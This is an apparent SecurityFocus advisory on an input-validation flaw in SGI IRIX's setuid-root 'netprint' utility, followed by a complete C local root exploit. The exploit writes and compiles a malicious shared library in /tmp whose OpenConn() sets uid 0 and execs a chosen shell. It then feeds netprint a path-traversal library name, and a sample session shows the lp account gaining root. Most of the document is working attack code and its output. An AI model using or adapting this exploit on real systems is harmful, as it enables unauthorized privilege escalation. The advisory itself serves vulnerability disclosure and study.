source: http://www.securityfocus.com/bid/2656/info

The 'netprint' utility shipped with SGI Irix systems is used to send print jobs to print spoolers on remote hosts. It is installed setuid root by default.

At the command line, 'netprint' accepts an option to specify the network type (-n). This option is argumented with a string representing the type. 'netprint' uses this argument to open a shared library.

There is no input validation on this string, and as a result it is possible for attackers to have malicious shared libraries used. Since 'netprint' is setuid root, malicious code contained in attacker supplied shared libraries will be executed with superuser privileges.

It has been reported that only 'lp' can execute 'netprint'. On many earlier versions of Irix, 'lp' was a passwordless default account. If this account has not been disabled, it is entirely possible for remote users to log into systems without a password as 'lp' and gain root access using this vulnerability. 

/* (IRIX)netprint[] local root exploit, by: v9[v9@fakehalo.org].  this will
   give you uid=0 on IRIX systems.  this exploit simply takes advantage of
   netprint's -n option to execute arbitrary code and gain elevated privileges.

   example:
------------------------------------------------------------------------------
$ cc xnetprint.c -o xnetprint
$ id
uid=9(lp) gid=9(lp)
$ ./xnetprint /bin/sh
[(IRIX)netprint[] local root exploit, by: v9[v9@realhalo.org]. ]
[*] making symbols source file for netprint to execute.
[*] done, now compiling symbols source file.
[*] done, now checking to see if the symbols source compiled.
[*] done, now executing netprint.
[*] success, uid: 0, euid: 0, gid: 0, egid: 0.
# id
uid=0(root) gid=0(sys)
#
------------------------------------------------------------------------------

   note: built and tested on IRIX 6.2.  this often requires the uid of lp
         to work correctly.  though, should prove effective up to 6.4 or
         higher.
*/
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#define PATH "/usr/lib/print/netprint" /* path to exploitable program. */
#define CCPATH "/usr/bin/cc" /* path to compiler. */
#define SRCFILE "/tmp/xnetrpintso.c" /* path to temporary symbols source. */
#define SOFILE "/tmp/xnetprintso.so" /* path to compile as. */
#define FAKESOFILE "../../../../tmp/xnetprintso" /* arg to feed netprint. */
void cleanup(unsigned short i){
 if(!access(SRCFILE,F_OK))
  unlink(SRCFILE);
 if(!access(SOFILE,F_OK))
  unlink(SOFILE);
 if(i)
  exit(i);
}
int main(int argc,char **argv){
 char *syscmd;
 struct stat mod;
 FILE *symbol;
 printf("[(IRIX)netprint[] local root exploit, by: v9[v9@realhalo.org]. ]\n");
 if(argc<2){
  printf("[!] syntax: %s </path/to/program/to/exec>\n",argv[0]);
  cleanup(1);
 }
 if(stat(PATH,&mod)){
  printf("[!] failed, could not get stats on %s.\n",PATH);
  cleanup(1);
 }
 if(mod.st_uid||!(S_ISUID&mod.st_mode)){
  printf("[!] failed, %s is not setuid root.\n",PATH);
  cleanup(1);
 }
 if(access(argv[1],X_OK)){
  printf("[!] failed, %s doesn't seem to exist or is not executable.\n",
  argv[1]);
  cleanup(1);
 }
 if(access(CCPATH,X_OK)){
  printf("[!] failed, %s compiler doesn't seem to exist or is not executable."
  "\n",CCPATH);
  cleanup(1);
 }
 printf("[*] making symbols source file for netprint to execute.\n");
 cleanup(0);
 if(!(symbol=fopen(SRCFILE,"w"))){
  printf("[!] failed, could not open temporary file to write to.\n");
  cleanup(1);
 }
 fprintf(symbol,"void OpenConn(){\n");
 fprintf(symbol," seteuid(0);\n");
 fprintf(symbol," setuid(0);\n");
 fprintf(symbol," setegid(0);\n");
 fprintf(symbol," setgid(0);\n");
 fprintf(symbol," printf(\"\[*] success, uid: %%u, euid: %%u, gid: %%u, egid: "
 "%%u.\\n\",getuid(),geteuid(),getgid(),getegid());\n");
 fprintf(symbol," execl(\"%s\",\"%s\",0);\n",argv[1],argv[1]);
 fprintf(symbol,"}\n");
 fprintf(symbol,"void CloseConn(){}\n");
 fprintf(symbol,"void ListPrinters(){}\n");
 fprintf(symbol,"void SendJob(){}\n");
 fprintf(symbol,"void CancelJob(){}\n");
 fprintf(symbol,"void WaitForJob(){}\n");
 fprintf(symbol,"void GetQueue(){}\n");
 fprintf(symbol,"void StartTagging(){}\n");
 fprintf(symbol,"void StopTagging(){}\n"); 
 fprintf(symbol,"void Install(){}\n");
 fprintf(symbol,"void IsDest(){}\n");
 fclose(symbol);
 printf("[*] done, now compiling symbols source file.\n");
 if(!(syscmd=(char *)malloc(strlen(CCPATH)+strlen(SRCFILE)+strlen(SOFILE)+13+1)
 )){
  printf("[!] failed, could not allocate memory.\n");
  cleanup(1);
 }
 sprintf(syscmd,"%s %s -shared -o %s",CCPATH,SRCFILE,SOFILE);
 system(syscmd);
 printf("[*] done, now checking to see if the symbols source compiled.\n");
 if(access(SOFILE,R_OK)){
  printf("[!] failed, symbols source was not compiled properly.\n");
  cleanup(1);
 }
 printf("[*] done, now executing netprint.\n");
 if(execl(PATH,PATH,"-n",FAKESOFILE,"-h0","-p0","0-0",0)){
  printf("[!] failed, %s did not execute properly.\n",PATH);
  cleanup(1);
 }
}
